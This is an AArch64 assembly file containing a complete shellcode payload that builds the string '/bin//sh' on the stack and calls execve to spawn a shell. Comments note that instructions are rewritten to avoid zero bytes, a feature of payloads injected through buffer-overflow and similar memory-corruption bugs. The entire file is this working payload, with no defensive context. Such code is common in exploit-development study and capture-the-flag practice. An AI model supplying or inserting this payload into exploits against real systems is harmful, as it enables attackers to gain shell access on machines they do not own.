.section .text
.global _start

_start:
    // Let x8 = 0x68732f2f6e69622f, which is "/bin//sh"
    movz x8, 0x622f
    movk x8, 0x6e69, lsl 16
    movk x8, 0x2f2f, lsl 32
    movk x8, 0x6873, lsl 48

    stp  x8, xzr, [sp, -16]!  // push 0 and x8 into stack
    //mov  x0, sp             // This one has a zero in the machine code
    adds x9, sp, 88           // x9 = sp + 88
    mov  x8, 88               // x8 = 88
    sub  x0, x9, x8           // x0 = x9 - x8 = sp

    stp  x0, xzr, [sp, -16]!  // push argv[0] and argv[1] into stack

    //mov  x1, sp             // This one has a zero in the machine code
    adds x9, sp, 88           // x9 = sp + 88
    mov  x8, 88               // x8 = 88
    sub  x1, x9, x8           // x1 = x9 - x8 = sp

    mov  x2, xzr              // x2 = 0
    mov  x8, 221              // x8 = 221: execve's system call number
    svc  0x1337               // Invoke execve()
